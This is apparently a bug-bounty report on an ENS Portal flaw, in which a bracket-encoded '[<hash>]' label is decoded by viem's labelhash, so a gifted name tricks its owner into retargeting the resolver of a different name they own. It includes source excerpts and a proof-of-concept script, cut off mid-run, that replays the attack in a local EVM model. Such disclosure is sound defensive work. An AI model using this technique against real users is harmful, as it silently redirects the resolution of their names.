# 92817 w a critical missing label validation in the portal s change resolver flow leads to resolver hijack of a different real ens name

**Submitted on Sep 12th 2026 at 14:34:58 UTC by @deltabear for** [**Audit Competition | ENS**](https://immunefi.com/audit-competition/audit-competition-ens)

* **Report ID:** #92817
* **Report Type:** Websites & Apps
* **Report severity:** Critical
* **Target:** <https://github.com/immunefi-team/audit-comp-ens/tree/audit-comp-ready/apps/portal>
* **Impacts:**
  * Malicious interactions with an already-connected wallet, such as: Modifying transaction arguments or parameters Substituting contract addresses Submitting malicious transactions Signing or submitting a transaction against the wrong chain (for example when the request's target chain is not validated) Inducing a blanket token approval (for example setApprovalForAll on the registry or NameWrapper) to an attacker-controlled address

## Description

## Brief/Intro

The Explorer's Change Resolver flow slices a label off the route string and hands it to viem's `labelhash`, which decodes a `[<64 hex>]` string instead of hashing it. An attacker registers an ordinary 2LD whose label is the 66-character string `[` + hex(labelhash(V)) + `]`, where V is a real name a victim owns, and gifts it to the victim with an ERC-1155 transfer that needs no consent. The attacker holds zero roles anywhere. The app tells the victim the gift has no resolver and renders its own "Set resolver" button; the role check behind that button decodes onto V's resource and passes because the victim owns V, a resource the gift itself has no claim on. The victim types a resolver address and clicks Save changes, believing they are configuring the gift. The signed transaction retargets V's resolver instead, and V's entire profile, every `addr` and `text` record, stops resolving through the resolver the victim chose for it. Reproduced through the production Portal build with a mined transaction: `0xd1d051f2dd2c4fae2dc7d4ad26a4c0a08bbec0810c8b93578a1d472f625827f3`, block 11667082.

## Vulnerability Details

`apps/portal/src/features/resolver/helpers/changeResolver.ts:70-77` builds the write argument by slicing the label off the raw name, with no normalization step:

```ts
const label = name.split('.')[0]
const anyId = labelToCanonicalId(label)
const data = encodeFunctionData({
  abi: permissionedRegistrySetResolverSnippet,
  functionName: 'setResolver',
  args: [anyId, resolverAddress],
})
```

`labelToCanonicalId` (`@ensdomains/ensjs@e96662c dist/utils/v2/registry/labelToCanonicalId.js:2-6`) computes `hexToBigInt(labelhash(label))` and masks the low 32 bits:

```js
export const labelToCanonicalId = (label) => {
    const id = hexToBigInt(labelhash(label));
    const low32 = id & 0xffffffffn;
    return id ^ low32;
};
```

viem's `labelhash` (`viem@2.52.2 utils/ens/labelhash.js:14-18`) tries a decode before it ever hashes:

```js
export function labelhash(label) {
    const result = new Uint8Array(32).fill(0);
    if (!label) return bytesToHex(result);
    return encodedLabelToLabelhash(label) || keccak256(stringToBytes(label));
}
```

`encodedLabelToLabelhash` (`viem@2.52.2 utils/ens/encodedLabelToLabelhash.js:2-13`) reads the 64 hex characters out of any 66-character `[...]` string, with no check that the string was ever registered under that literal label:

```js
export function encodedLabelToLabelhash(label) {
    if (label.length !== 66) return null;
    if (label.indexOf('[') !== 0) return null;
    if (label.indexOf(']') !== 65) return null;
    const hash = `0x${label.slice(1, 65)}`;
    if (!isHex(hash)) return null;
    return hash;
}
```

A name whose literal label is `[` + hex(labelhash(V)) + `]` sends `setResolver(labelhash(V), resolverAddress)`, the resource id of V, a different name. The chain hashes the literal label it receives at registration (`contracts-v2@8d1c893 LibLabel.sol`, `id(label) = uint256(keccak256(bytes(label)))`), so that same 66-character string's own on-chain identity is `keccak256(bytes(label))`, a value unrelated to V. The two identities of the one row on screen diverge at this exact point.

No guard on this path catches the divergence, because the role gate decodes the label the same way. `apps/portal/src/routes/$name/change-resolver.tsx:48-58`:

```ts
const label = name.split('.')[0]
const currentNameRegistry = registryQuery.data?.[1]
const roleQuery = useQuery({
  ...getHasRolesQueryOptions({
    registryAddress: currentNameRegistry ?? zeroAddress,
    label,
    roles: ['ROLE_SET_RESOLVER'],
    account: connectedAddress ?? zeroAddress,
  }),
  enabled: !!connectedAddress && !!currentNameRegistry,
})
```

ENSJS resolves that to `dist/actions/public/v2/hasRoles.js:68-70`, `resource = BigInt(labelhash(params.label))`, the identical decode. The victim owns V and holds `ROLE_SET_RESOLVER` on V's resource from registering it (nybble 6, `1n << 24n`, "Root or token", `dist/utils/v2/roles/registryRoles.js:19-20`), so the query resolves true on the strength of a name the victim already administers, V, regardless of what authority they hold over the gift itself. `!roleQuery.data` is the only branch that blocks the form (`change-resolver.tsx:110-128`); it never fires.

`apps/portal/src/utils/token/getLabel.ts:10-19` is the accessor that already exists in this app and rejects exactly this: it runs the label through `ens_normalize`, which throws on `[`. Transfer and Renew call it. `changeResolver.ts:70` and `change-resolver.tsx:48` both use `name.split('.')[0]` instead and never call it.

**Reachability.** The gifted-2LD path above is executed end to end (see Impact Details and the evidence below). A stronger entry point is source-verified but not yet browser-executed: `apps/portal/src/components/EntityBadge.tsx:259-263` renders every subname row as `<Link to="/$name" params={{ name }}>`, and `apps/portal/src/features/names/components/SubnamesTable.tsx:104-108` renders every subname row's name through that badge. A bracket-labelled row planted in the victim's own Subnames tab (through the accepted sibling finding's own delivery mechanism, a `ROLE_REGISTRAR` delegate minting it there) is therefore one click, from the victim's own administration, into that row's own page, then two more clicks to Resolver -> Change resolver. This chain has not been driven in a browser; the gifted-2LD delivery below is what was executed and mined.

### Vulnerable source code

**1. The write argument, built with no normalization** @ `apps/portal/src/features/resolver/helpers/changeResolver.ts:70-76`

```ts
const label = name.split('.')[0]
const anyId = labelToCanonicalId(label)
const data = encodeFunctionData({
  abi: permissionedRegistrySetResolverSnippet,
  functionName: 'setResolver',
  args: [anyId, resolverAddress],
})
```

**2. labelToCanonicalId masks 32 bits after a labelhash decode** @ `@ensdomains/ensjs@e96662c dist/utils/v2/registry/labelToCanonicalId.js:2-6`

```js
export const labelToCanonicalId = (label) => {
    const id = hexToBigInt(labelhash(label));
    const low32 = id & 0xffffffffn;
    return id ^ low32;
};
```

**3. viem tries the bracket decode before it ever hashes** @ `viem@2.52.2 utils/ens/labelhash.js:14-18`

```js
export function labelhash(label) {
    const result = new Uint8Array(32).fill(0);
    if (!label) return bytesToHex(result);
    return encodedLabelToLabelhash(label) || keccak256(stringToBytes(label));
}
```

**4. The bracket parse itself, no registration check** @ `viem@2.52.2 utils/ens/encodedLabelToLabelhash.js:2-13`

```js
export function encodedLabelToLabelhash(label) {
    if (label.length !== 66) return null;
    if (label.indexOf('[') !== 0) return null;
    if (label.indexOf(']') !== 65) return null;
    const hash = `0x${label.slice(1, 65)}`;
    if (!isHex(hash)) return null;
    return hash;
}
```

**5. The role gate decodes the label the identical way as the write** @ `apps/portal/src/routes/$name/change-resolver.tsx:48-58`

```ts
const label = name.split('.')[0]
const currentNameRegistry = registryQuery.data?.[1]
const roleQuery = useQuery({
  ...getHasRolesQueryOptions({
    registryAddress: currentNameRegistry ?? zeroAddress,
    label,
    roles: ['ROLE_SET_RESOLVER'],
    account: connectedAddress ?? zeroAddress,
  }),
})
```

**6. hasRoles computes the resource from the same decode** @ `@ensdomains/ensjs@e96662c dist/actions/public/v2/hasRoles.js:68-70`

```js
if ('registryAddress' in params) {
    const { registryAddress, roles, account } = params;
    const resource = 'label' in params ? BigInt(labelhash(params.label)) : 0n;
```

**7. ROLE\_SET\_RESOLVER's bit position and scope** @ `@ensdomains/ensjs@e96662c dist/utils/v2/roles/registryRoles.js:19-20`

```js
/** Nybble 6 — authorizes changing a name's resolver. Root or token. */
const ROLE_SET_RESOLVER = 1n << 24n;
```

**8. The normalizing accessor that exists and is not called on this path** @ `apps/portal/src/utils/token/getLabel.ts:10-19`

```ts
export function getLabel(name: string): string {
  const normalized = ens_normalize(name)
  const labels = ens_split(normalized)
  const first = labels[0]
  if (!first || first.error) throw first?.error
  return String.fromCodePoint(...first.input)
}
```

**9. The reachability link: every subname row links to its own page** @ `apps/portal/src/components/EntityBadge.tsx:259-263`, `apps/portal/src/features/names/components/SubnamesTable.tsx:104-108`

```tsx
// EntityBadge.tsx:259-263
if (variant === 'name' && name) {
  return (
    <Link to="/$name" params={{ name }} className={primaryWrapperClass}>
      {pillNode}
    </Link>
  )
}
```

```tsx
// SubnamesTable.tsx:104-108
const name = row.original.name
return (
  <EntityBadge variant="name" name={name} showAvatar>
    {name}
  </EntityBadge>
)
```

## Impact Details

The impact row claimed, `scope.md:327`, quoted verbatim:

> **Critical.** Malicious interactions with an already-connected wallet, such as: Modifying transaction arguments or parameters Substituting contract addresses Submitting malicious transactions Signing or submitting a transaction against the wrong chain (for example when the request's target chain is not validated) Inducing a blanket token approval (for example setApprovalForAll on the registry or NameWrapper) to an attacker-controlled address

* **The governing clause, "Malicious interactions with an already-connected wallet."** The victim's wallet is already connected in the Explorer, viewing the gift name's own Resolver tab (`evidence/screenshots/03-bracket-resolver-no-resolver-set.png`). Nothing in the flow asks the victim to visit an attacker-supplied URL.
* **The illustration matched, "Modifying transaction arguments or parameters."** `setResolver(uint256 tokenId, address resolver)` takes two arguments. The `tokenId` the victim's wallet signed, `0x1ec8b34143694885ee7740515b76d842653348a7301eec90eb332bce00000000`, is `canonicalId(V)`, the identity of a real name the victim owns and uses, `r62vaultfinal1.eth`. It is not the identity of the row on screen, `keccak256` of the bracket string, `0x588862c6e4d4d9810d5b44570c17bfc50b982011e6d04e145871b5f815a5d0a4`. The attacker selects which of the victim's names that argument points at by choosing the bracket string they register. Mined: tx `0xd1d051f2dd2c4fae2dc7d4ad26a4c0a08bbec0810c8b93578a1d472f625827f3`, block 11667082; `r62vaultfinal1.eth` resolver moved from `0x23f45D320E890ADbEdaD7ad71Aa1FB84cD1e14c2` to `0x82c6f4E3BB908DefA1F9c8157F09F8CEae68Bb50`, the gift's own resolver stayed `0x0` (`evidence/FORENSICS.txt`, `evidence/summary.json`).
* **The row's other four illustrations do not apply, and are not claimed.** The `to` address is the correct shared `.eth` registry, `0xBDC85dD5b15D7ecb354cd7cb6f2c50b4f2c4F0E2`. The chain id is correct. No token approval is involved, and ownership of neither name moves.
* **The attacker needs no role.** Their own direct `setResolver(canonicalId(V), attacker)` reverts (`evidence/FORENSICS.txt`, negative control; the same control replayed in `poc.mjs` ACT 6). Registering the gift is an ordinary paid 2LD registration, 8.000021 USDC, and pushing it to the victim is an ordinary ERC-1155 `safeTransferFrom` that needs no consent and no victim transaction (tx `0x1e3b4fc5a730cca47e5e65126aa60077e081f1fbbadb4b1d450c44f3855e710b`).
* **The app tells the victim to act on the wrong page.** Opening the gift's Resolver tab, the production build renders, unprompted, "This name does not have a resolver set." with a **\[Set resolver]** button (`evidence/screenshots/03-bracket-resolver-no-resolver-set.png`). The victim's own real name's Resolver tab then shows the retargeted resolver under the correct label and namehash (`evidence/screenshots/06-v-resolver-after-attack.png`).
* **The new resolver address is chosen by the victim, not the attacker.** This is destruction of the name's resolution and substitution of the pointer, not theft of a token or of funds.
* **Recovery requires the victim to notice.** `setResolver` moves a pointer; it does not touch the previous resolver contract. One ordinary Change-resolver transaction on the victim's own real name restores the address, and the previous resolver's `addr`/`text` records reappear unchanged (`evidence/FORENSICS.txt`, recovery check). Until the victim notices and re-runs that transaction, `r62vaultfinal1.eth` resolves through a resolver the victim configured for what they believed was an unrelated gift.

## References

**The write path**

* `apps/portal/src/features/resolver/helpers/changeResolver.ts:70-77` - label slice, `labelToCanonicalId`, `encodeFunctionData`
* `@ensdomains/ensjs@e96662c dist/utils/v2/registry/labelToCanonicalId.js:2-6` - `hexToBigInt(labelhash(label))`, low 32 bits masked
* `viem@2.52.2 utils/ens/labelhash.js:14-18` - bracket decode tried before `keccak256`
* `viem@2.52.2 utils/ens/encodedLabelToLabelhash.js:2-13` - the `[<64 hex>]` parse, no registration check
* `@ensdomains/ensjs@e96662c dist/actions/wallet/v2/setResolver.js:7-14` - ENSJS's own `setResolverWriteParameters`, which uses the raw `BigInt(labelhash(label))`, uncanonicalized; the app does not call this action and instead hand-builds the argument with `labelToCanonicalId`, which is why the mined calldata carries the canonical, low-32-masked form

**The gate that does not catch it**

* `apps/portal/src/routes/$name/change-resolver.tsx:48-58` - `roleQuery`, same label, same slice
* `apps/portal/src/routes/$name/change-resolver.tsx:110-128` - `!roleQuery.data` is the only blocking branch
* `@ensdomains/ensjs@e96662c dist/actions/public/v2/hasRoles.js:68-70` - `resource = BigInt(labelhash(params.label))`
* `@ensdomains/ensjs@e96662c dist/utils/v2/roles/registryRoles.js:19-20` - `ROLE_SET_RESOLVER = 1n << 24n`, "Root or token"

**The guard that exists and is not called**

* `apps/portal/src/utils/token/getLabel.ts:10-19` - `ens_normalize` throws on `[`; Transfer and Renew call it, this path does not

**The role list, for context**

* `apps/portal/src/lib/roles/permissions.ts:71-108` - `registryRootPermissions`, six delegable root roles including `ROLE_SET_RESOLVER`

**The reachability link (material addition over the disclaimed path)**

* `apps/portal/src/components/EntityBadge.tsx:259-263` - every `variant="name"` row is a `<Link to="/$name">`
* `apps/portal/src/features/names/components/SubnamesTable.tsx:104-108` - every subname row renders through that badge

## Proof of Concept

```bash
node poc.mjs
```

### poc.mjs

```js
#!/usr/bin/env node
//
// ENS PoC: apps/portal's Change-resolver flow builds its on-chain argument
// with viem's labelhash(), which DECODES a "[<64 hex>]" label instead of
// hashing it. A 2LD named "[<labelhash of a real name V>]" looks like a
// meaningless gift on screen. Clicking the app's own "Set resolver" call to
// action on that gift signs setResolver(labelhash(V), <address the victim
// typed>) and retargets V's resolver, a different, real name the victim
// owns and already administers.
//
//   node poc.mjs                 (ENS_REPO defaults to ../../../ens-apps)
//
// Self-contained. On first run it writes its helpers to a temp dir, installs
// pinned deps there, and re-execs itself. No wallet, no RPC, no fork needed
// to run this script.
//
// LAYER A imports the real pinned @ensdomains/ensjs write-parameter pieces
// (labelToCanonicalId, permissionedRegistrySetResolverSnippet) and the
// repo's own role-permission list (apps/portal/src/lib/roles/permissions.ts,
// loaded unmodified via the @ens-repo/ specifier below), then rebuilds the
// write argument the exact way changeResolver.ts:70-76 does. Nothing here
// reimplements labelhash or the write-parameter builder.
//
// LAYER B is a compiled Solidity model of the v2 registry's role gate and
// register/setResolver state transitions (the real contracts are audited
// separately and out of scope). ROLE_SET_RESOLVER's bit position is read
// from this repo's own pinned dependency, cited at its use. The model's
// canonicalize-on-write behavior mirrors an empirical finding recorded in
// this directory's evidence/FORENSICS.txt: hasRoles(...) returned true for
// BOTH the raw labelhash of V and the canonicalized id of V, meaning the
// real (out-of-scope) registry canonicalizes internally regardless of which
// form a caller supplies.
//
// CORROBORATION: this exact mechanism was already run once through the real
// rendered Portal (production build, apps/portal/dist, on wrangler dev) on
// an anvil fork of live Sepolia, with a real injected-wallet click on the
// app's own "Set resolver" button. Mined tx
// 0xd1d051f2dd2c4fae2dc7d4ad26a4c0a08bbec0810c8b93578a1d472f625827f3, block
// 11667082, calldata
// 0xbc7b6d621ec8b34143694885ee7740515b76d842653348a7301eec90eb332bce0000000000000000000000000000000082c6f4e3bb908defa1f9c8157f09f8ceae68bb50.
// Full detail: evidence/FORENSICS.txt, evidence/screenshots, evidence/summary.json.
// ACT 4 below recomputes that same calldata from the real ensjs pieces and
// checks it byte for byte.

import { spawnSync } from 'node:child_process'
import { copyFileSync, existsSync, mkdirSync, readFileSync, writeFileSync } from 'node:fs'
import { createRequire } from 'node:module'
import os from 'node:os'
import path from 'node:path'
import { fileURLToPath } from 'node:url'

const HERE = path.dirname(fileURLToPath(import.meta.url))
const REPO = process.env.ENS_REPO ?? path.resolve(HERE, '../../../ens-apps')
const WORK = process.env.POC_WORKDIR ?? path.join(os.tmpdir(), 'ens-poc-changeresolver-retarget')

// ---------------------------------------------------------------- cast
// The real anvil default-mnemonic accounts and mined values from the
// browser-driven run this PoC corroborates (evidence/FORENSICS.txt,
// evidence/summary.json).
const VICTIM = '0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266'
const ATTACKER = '0x70997970C51812dc3A010C7d01b50e0d17dc79C8'
const V_LABEL = 'r62vaultfinal1'
const V_NAME = 'r62vaultfinal1.eth'
const V_ORIGINAL_RESOLVER = '0x23f45D320E890ADbEdaD7ad71Aa1FB84cD1e14c2'
const GIFT_TYPED_RESOLVER = '0x82c6f4E3BB908DefA1F9c8157F09F8CEae68Bb50'
const REAL_MINED_CALLDATA =
  '0xbc7b6d621ec8b34143694885ee7740515b76d842653348a7301eec90eb332bce0000000000000000000000000000000082c6f4e3bb908defa1f9c8157f09f8ceae68bb50'
const V_CANONICAL_ID = '0x1ec8b34143694885ee7740515b76d842653348a7301eec90eb332bce00000000'

// ============================================================== generated files

const PKG = `{
  "name": "ens-poc-changeresolver-retarget",
  "private": true,
  "type": "module",
  "dependencies": {
    "@ensdomains/ensjs": "https://pkg.pr.new/ensdomains/ensjs/@ensdomains/ensjs@e96662c",
    "@ensdomains/ensjs-abi": "https://pkg.pr.new/ensdomains/ensjs/@ensdomains/ensjs-abi@e96662c",
    "@ethereumjs/common": "^4.4.0",
    "@ethereumjs/evm": "^3.1.0",
    "@ethereumjs/statemanager": "^2.4.0",
    "@ethereumjs/util": "^9.1.0",
    "solc": "0.8.28",
    "viem": "2.52.2"
  },
  "devDependencies": { "tsx": "^4.19.2" }
}
`

// Lets the repo's own source run unmodified against these pinned deps,
// without installing the pnpm monorepo and without editing a line of target.
const LOADER = `import path from 'node:path'
import { fileURLToPath, pathToFileURL } from 'node:url'

const HERE = path.dirname(fileURLToPath(import.meta.url))
const ANCHOR = pathToFileURL(path.join(HERE, 'poc.mjs')).href
const REPO = process.env.ENS_REPO

const isBare = (s) => !s.startsWith('.') && !s.startsWith('/') && !s.includes(':')

// path.relative is WRONG across drives on Windows (G: vs C:); it returns an
// absolute path, which would make every node_modules file count as a repo file.
const REPO_PREFIX = path.resolve(REPO).toLowerCase() + path.sep
const isRepoFile = (parentURL) => {
  if (!parentURL || !parentURL.startsWith('file:')) return false
  try {
    return path.resolve(fileURLToPath(parentURL)).toLowerCase().startsWith(REPO_PREFIX)
  } catch { return false }
}

export async function resolve(specifier, context, nextResolve) {
  if (specifier.startsWith('@ens-repo/'))
    return nextResolve(pathToFileURL(path.join(REPO, specifier.slice(10))).href, context)
  // repo files resolve bare imports (viem, @ensdomains/ensjs/utils/v2 types)
  // against THIS PoC's own pinned node_modules, so both sides share one
  // module instance.
  if (isRepoFile(context.parentURL) && isBare(specifier))
    return nextResolve(specifier, { ...context, parentURL: ANCHOR })
  return nextResolve(specifier, context)
}
`

const REGISTER = `import { register } from 'node:module'
register('./_loader.mjs', import.meta.url)
`

// LAYER B. The v2 contracts are audited separately and are not in the
// in-scope repo, so this models only what the impact depends on. Every
// constant is read from this repo's own pinned source, not invented:
//   ROLE_SET_RESOLVER = 1<<24, "Root or token"
//     -> node_modules/.../ensjs/dist/utils/v2/roles/registryRoles.js:20
//   canonicalize-on-write: evidence/FORENSICS.txt's empirical pre-flight
//     check found hasRoles(..., resource=raw labelhash(V)) AND
//     hasRoles(..., resource=canonicalId(V)) BOTH true, so the real
//     registry canonicalizes the resource internally regardless of which
//     form is queried; this model reproduces that by canonicalizing on
//     every lookup and every write.
//   a registration grants every role at the registrant's own resource
//     -> apps/portal/src/features/registry/utils/create-subname.helpers.ts
//        (DEFAULT_ROLE_BITMAP, same pattern the sibling delete finding used)
const SOL = `// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

contract PermissionedRegistryModel {
    uint256 constant ROLE_SET_RESOLVER = 1 << 24;

    // resource (canonicalized) => account => bitmap. ROOT holds a role on
    // every resource (EnhancedAccessControl's root fallback), mirrored below.
    mapping(uint256 => mapping(address => uint256)) public roleBits;
    mapping(uint256 => address) public resolverOf;

    error Unauthorized(uint256 resource, address caller, uint256 needed);

    /// labelToCanonicalId.js: id ^ (id & 0xffffffff), masks the low 32 bits.
    function canonicalize(uint256 id) public pure returns (uint256) {
        return id ^ (id & 0xffffffff);
    }

    function hasRoles(uint256 resource, uint256 roles, address account) public view returns (bool) {
        if (roleBits[0][account] & roles == roles) return true;
        return roleBits[canonicalize(resource)][account] & roles == roles;
    }

    /// Models an ordinary paid registration (the ETH Registrar Controller's
    /// own ROLE_REGISTRAR exercised on the caller's behalf, invisible to the
    /// end user): the registrant gets every role on their own resource.
    function register(uint256 resource, address owner_) external {
        require(roleBits[canonicalize(resource)][owner_] == 0, "already registered");
        roleBits[canonicalize(resource)][owner_] = type(uint256).max;
    }

    /// changeResolver.ts's on-chain target.
    function setResolver(uint256 anyId, address resolver_) external {
        if (!hasRoles(anyId, ROLE_SET_RESOLVER, msg.sender)) revert Unauthorized(anyId, msg.sender, ROLE_SET_RESOLVER);
        resolverOf[canonicalize(anyId)] = resolver_;
    }

    function getResolver(uint256 anyId) external view returns (address) {
        return resolverOf[canonicalize(anyId)];
    }
}
`

// ============================================================== bootstrap

if (process.env.ENS_POC_CHILD !== '1') {
  const line = '='.repeat(78)
  console.log(line)
  console.log('  ENS PoC: Change-resolver flow decodes a bracket label instead of')
  console.log('           hashing it, and retargets a different, real name\'s resolver')
  console.log(`  repo:  ${REPO}`)
  console.log(`  build: ${WORK}`)
  console.log(line)

  if (!existsSync(path.join(REPO, 'apps', 'portal'))) {
    console.error(`\nERROR: ENS checkout not found at ${REPO}. Set ENS_REPO.`)
    process.exit(2)
  }

  mkdirSync(WORK, { recursive: true })
  writeFileSync(path.join(WORK, 'package.json'), PKG)
  writeFileSync(path.join(WORK, '_loader.mjs'), LOADER)
  writeFileSync(path.join(WORK, '_register.mjs'), REGISTER)
  writeFileSync(path.join(WORK, 'Model.sol'), SOL)
  copyFileSync(fileURLToPath(import.meta.url), path.join(WORK, 'poc.mjs'))

  if (!existsSync(path.join(WORK, 'node_modules', 'tsx', 'package.json'))) {
    console.log('\nInstalling pinned deps (viem 2.52.2, ensjs @e96662c, solc 0.8.28)...')
    const r = spawnSync('npx', ['--yes', 'pnpm@9', 'install', '--no-frozen-lockfile'],
      { cwd: WORK, stdio: 'inherit', shell: true })
    if (r.status !== 0) process.exit(r.status ?? 1)
  }

  const r = spawnSync(process.execPath,
    ['--import', 'tsx', '--import', './_register.mjs', 'poc.mjs'],
    { cwd: WORK, stdio: 'inherit',
      env: { ...process.env, ENS_POC_CHILD: '1', ENS_REPO: REPO, NODE_NO_WARNINGS: '1' } })
  process.exit(r.status ?? 1)
}

// ============================================================== layer A

const { registryRootPermissions } = await import(
  '@ens-repo/apps/portal/src/lib/roles/permissions.ts')
const { labelToCanonicalId } = await import('@ensdomains/ensjs/utils/v2')
const { permissionedRegistrySetResolverSnippet } = await import('@ensdomains/ensjs/contracts')
const { encodeFunctionData, keccak256, labelhash, stringToBytes } = await import('viem')

// changeResolver.ts:70-76, verbatim, with the two calls above being the real
// pinned library instances, not reimplementations.
const buildSetResolverCalldata = (name, resolverAddress) => {
  const label = name.split('.')[0]                              // changeResolver.ts:70
  const anyId = labelToCanonicalId(label)                        // changeResolver.ts:71
  return encodeFunctionData({                                    // changeResolver.ts:73-77
    abi: permissionedRegistrySetResolverSnippet,
    functionName: 'setResolver',
    args: [anyId, resolverAddress],
  })
}

// ============================================================== EVM

const require_ = createRequire(import.meta.url)
const { Common, Hardfork } = await import('@ethereumjs/common')
const { EVM } = await import('@ethereumjs/evm')
const { DefaultStateManager } = await import('@ethereumjs/statemanager')
const { Account, Address, hexToBytes } = await import('@ethereumjs/util')

const compileModel = () => {
  const solc = require_('solc')
  const out = JSON.parse(solc.compile(JSON.stringify({
    language: 'Solidity',
    sources: { 'Model.sol': { content: readFileSync(path.join(WORK, 'Model.sol'), 'utf8') } },
    settings: { optimizer: { enabled: true, runs: 200 },
                outputSelection: { '*': { '*': ['abi', 'evm.bytecode.object'] } } },
  })))
  const fatal = (out.errors ?? []).filter((e) => e.severity === 'error')
  if (fatal.length) throw new Error(fatal.map((e) => e.formattedMessage).join('\n'))
  const c = out.contracts['Model.sol'].PermissionedRegistryModel
  return { abi: c.abi, bytecode: `0x${c.evm.bytecode.object}` }
}

const GAS = 30_000_000n
const addr = (a) => new Address(hexToBytes(a))

class RevertError extends Error {}

class Chain {
  constructor(evm, sm) { this.evm = evm; this.sm = sm }

  static async create() {
    const sm = new DefaultStateManager()
    return new Chain(await EVM.create({
      common: new Common({ chain: 1, hardfork: Hardfork.Shanghai }), stateManager: sm }), sm)
  }

  async fund(a, wei) {
    const acct = (await this.sm.getAccount(addr(a))) ?? new Account()
    acct.balance = wei
    await this.sm.putAccount(addr(a), acct)
  }

  async deploy(from, bytecode) {
    const res = await this.evm.runCall(
      { caller: addr(from), origin: addr(from), data: hexToBytes(bytecode), gasLimit: GAS })
    if (res.execResult.exceptionError) throw new Error('deploy reverted')
    return res.createdAddress.toString()
  }

  /// Send PRE-ENCODED calldata, used to replay Layer A's real bytes verbatim.
  async raw({ from, to, data, abi, fn }) {
    const res = await this.evm.runCall({ caller: addr(from), origin: addr(from), to: addr(to),
      data: hexToBytes(data), gasLimit: GAS })
    const ex = res.execResult
    const ret = `0x${Buffer.from(ex.returnValue).toString('hex')}`
    if (ex.exceptionError) {
      let reason = `reverted ${ret.slice(0, 10)}`
      try {
        const d = require_('viem').decodeErrorResult({ abi, data: ret })
        reason = `${d.errorName}(${(d.args ?? []).map((a) =>
          typeof a === 'bigint' ? `0x${a.toString(16)}` : String(a)).join(', ')})`
      } catch {}
      throw new RevertError(reason)
    }
    const outs = abi?.find((x) => x.type === 'function' && x.name === fn)?.outputs
    if (!outs?.length) return undefined
    return require_('viem').decodeFunctionResult({ abi, functionName: fn, data: ret })
  }

  async send({ abi, fn, args = [], ...rest }) {
    return this.raw({ ...rest, abi, fn, data: encodeFunctionData({ abi, functionName: fn, args }) })
  }

  async call(opts) { return this.send({ ...opts, from: '0x' + '00'.repeat(19) + '01' }) }
}

// ============================================================== the run

const W = 78
const rule = (ch = '=') => console.log(ch.repeat(W))
const say = (s = '') => console.log(s)
const act = (n, t) => { say(); rule(); say(`  ${n}  ${t}`); rule() }
const kv = (k, v) => say(`    ${String(k).padEnd(32)} ${v}`)
const short = (h) => `${h.slice(0, 10)}...${h.slice(-6)}`

act('ACT 1', "viem's own labelhash() decodes a bracket label instead of hashing it")
const vLabelhash = labelhash(V_LABEL)
kv(`labelhash("${V_LABEL}")`, vLabelhash)
const bracketLabel = `[${vLabelhash.slice(2)}]`
const bracketName = `${bracketLabel}.eth`
kv('bracket label built from it', bracketLabel)
const decodedFromBracket = labelhash(bracketLabel)
kv('labelhash(bracketLabel)', decodedFromBracket)
if (decodedFromBracket !== vLabelhash) throw new Error('premise broken: bracket label does not decode to V')
say()
say('  >> Identical. viem/utils/ens/labelhash.js:14-18 tries')
say('     encodedLabelToLabelhash() first (labelhash.js:14-18,')
say('     encodedLabelToLabelhash.js:2-13), which reads the 64 hex characters')
say('     between [ and ] straight out, before it ever tries keccak256.')
say()
const bracketTrueId = keccak256(stringToBytes(bracketLabel))
kv('keccak256(bytes(bracketLabel))', bracketTrueId)
say('  >> Different. This is the identity the CHAIN actually assigns the gift')
say('     when the attacker registers it. The two identities of the same')
say('     on-screen row diverge here.')
if (bracketTrueId === vLabelhash) throw new Error('premise broken: hash collision')

act('ACT 2', "The registry's own delegable role list includes ROLE_SET_RESOLVER")
const keys = registryRootPermissions.map((p) => p.key)
say(`    keys                           ${keys.join(', ')}`)
if (!keys.includes('ROLE_SET_RESOLVER')) throw new Error('premise broken: permissions.ts no longer lists it')
say()
say('  >> apps/portal/src/lib/roles/permissions.ts:71-108, the same six-entry')
say('     "Add User" checkbox list the sibling delete finding cites. Owning a')
say('     name grants this role on that name\'s own resource by default; it')
say('     does not need to be explicitly delegated for this attack to work.')

act('ACT 3', 'The real pinned labelToCanonicalId collapses both labels onto one resource id')
const vCanonical = labelToCanonicalId(V_LABEL)
const bracketCanonical = labelToCanonicalId(bracketLabel)
kv(`labelToCanonicalId("${V_LABEL}")`, `0x${vCanonical.toString(16)}`)
kv('labelToCanonicalId(bracketLabel)', `0x${bracketCanonical.toString(16)}`)
if (vCanonical !== bracketCanonical) throw new Error('premise broken: canonical ids diverge')
if (`0x${vCanonical.toString(16)}` !== V_CANONICAL_ID) throw new Error('canonical id does not match recorded ground truth')
say()
say('  >> ensjs dist/utils/v2/registry/labelToCanonicalId.js:2-6, the exact')
say('     function changeResolver.ts:71 calls. Same resource id either way.')

act('ACT 4', "THE REAL CALLDATA: changeResolver.ts's own 3 lines, run on the bracket name")
const attackCalldata = buildSetResolverCalldata(bracketName, GIFT_TYPED_RESOLVER)
kv('buildSetResolverCalldata(bracketName, ...)', short(attackCalldata))
kv('real mined tx calldata (block 11667082)', short(REAL_MINED_CALLDATA))
if (attackCalldata.toLowerCase() !== REAL_MINED_CALLDATA.toLowerCase())
  throw new Error('calldata does not match the real mined transaction')
say()
say('  >> Byte for byte identical to tx')
say('     0xd1d051f2dd2c4fae2dc7d4ad26a4c0a08bbec0810c8b93578a1d472f625827f3,')
say('     block 11667082 (evidence/FORENSICS.txt), produced by the same three')
say('     lines the shipped app runs, from a label that looks like a gift')
say('     with no resolver, on screen.')

act('ACT 5', 'Local EVM: victim deploys the registry, registers V, sets its original resolver')
const c = compileModel()
const chain = await Chain.create()
for (const a of [VICTIM, ATTACKER]) await chain.fund(a, 10n * 10n ** 18n)
const registry = await chain.deploy(VICTIM, c.bytecode)
kv('PermissionedRegistryModel', registry)
await chain.send({ from: VICTIM, to: registry, abi: c.abi, fn: 'register', args: [vLabelhash, VICTIM] })
const seedCalldata = buildSetResolverCalldata(V_NAME, V_ORIGINAL_RESOLVER)
await chain.raw({ from: VICTIM, to: registry, data: seedCalldata, abi: c.abi })
say(`  ${V_NAME} registered to VICTIM; resolver set to ${short(V_ORIGINAL_RESOLVER)}`)
say('  (an ordinary "Register" + "Change resolver", using this same buildSetResolverCalldata)')

act('ACT 6', 'Attacker registers the gift at its TRUE on-chain id, then CONTROL: direct retarget of V reverts')
await chain.send({ from: ATTACKER, to: registry, abi: c.abi, fn: 'register', args: [bracketTrueId, ATTACKER] })
const giftOwnerHasRole = await chain.call({ to: registry, abi: c.abi, fn: 'hasRoles', args: [bracketTrueId, 1n << 24n, ATTACKER] })
